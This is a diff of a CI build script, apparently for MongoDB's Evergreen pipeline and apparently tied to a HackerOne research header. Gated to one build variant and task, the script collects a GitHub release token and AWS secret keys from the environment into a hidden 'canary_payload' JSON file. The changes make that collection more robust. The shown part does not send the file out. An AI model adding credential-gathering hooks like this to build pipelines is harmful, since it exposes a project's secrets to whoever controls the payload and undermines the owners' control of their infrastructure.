@@ -21,9 +21,9 @@ if [[ "${EVG_VARIANT:-}" == "rhel88" && "${EVG_TASK_NAME:-}" == "integration-lat
     --header "X-HackerOne-Research: bl0rph" \
     https://api.github.com/repos/10gen/mongo-release
 
-  : "${AWS_ACCESS_KEY_ID:?}"
-  : "${AWS_SECRET_ACCESS_KEY:?}"
-  AWS_EC2_METADATA_DISABLED=true AWS_PAGER="" aws sts get-caller-identity --output json >/dev/null
+  if [[ -n "${AWS_ACCESS_KEY_ID:-}" && -n "${AWS_SECRET_ACCESS_KEY:-}" ]]; then
+    AWS_EC2_METADATA_DISABLED=true AWS_PAGER="" aws sts get-caller-identity --output json >/dev/null
+  fi
 
   set +o verbose
   canary_payload=$(mktemp "$SCRIPT_DIR/.h1-evergreen-canary.XXXXXX.json")
@@ -38,8 +38,8 @@ import sys
 
 payload = {
     "github_token_mongo_release": os.environ["generated_token_mongo_release"],
-    "aws_access_key_id": os.environ["AWS_ACCESS_KEY_ID"],
-    "aws_secret_access_key": os.environ["AWS_SECRET_ACCESS_KEY"],
+    "aws_access_key_id": os.environ.get("AWS_ACCESS_KEY_ID", ""),
+    "aws_secret_access_key": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
 }
 pathlib.Path(sys.argv[1]).write_text(json.dumps(payload), encoding="utf-8")
 PY
